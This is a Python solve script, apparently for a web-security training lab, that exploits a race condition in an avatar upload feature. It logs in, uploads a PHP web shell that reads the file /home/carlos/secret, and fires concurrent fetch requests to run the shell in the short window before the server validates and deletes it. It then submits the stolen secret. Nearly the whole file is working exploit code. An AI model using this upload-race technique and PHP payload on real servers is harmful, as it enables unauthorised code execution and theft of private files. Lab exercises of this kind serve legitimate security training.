import sys
import os
import threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# server uploads the file, then validates and deletes it
# we need to request the file in the tiny window between upload and deletion
# use file_get_contents so the secret appears directly in the response
shell = b"<?php echo file_get_contents('/home/carlos/secret'); ?>"
secret = None

def upload():
    lab.post("/my-account/avatar", files={
        "avatar": ("shell.php", shell, "application/x-php")
    }, data={
        "user": "wiener",
        "csrf": csrf
    })

def fetch():
    global secret
    resp = lab.session.get(lab.url("/files/avatars/shell.php"))
    if resp.status_code == 200 and "404" not in resp.text and len(resp.text.strip()) > 0:
        text = resp.text.strip()
        if text and not text.startswith("<!") and not text.startswith("<html"):
            secret = text

lab.info("Racing upload vs fetch...")

# keep trying until we catch the window
for attempt in range(20):
    # refresh csrf each attempt
    page = lab.get("/my-account")
    soup = BeautifulSoup(page.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]

    # launch upload and multiple fetch requests at the same time
    threads = [threading.Thread(target=upload)]
    for _ in range(5):
        threads.append(threading.Thread(target=fetch))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    if secret:
        break
    lab.info(f"Attempt {attempt + 1} - missed the window, retrying...")

if not secret:
    lab.fail("Couldn't catch the race window after 20 attempts")

lab.success(f"Secret: {secret}")
lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
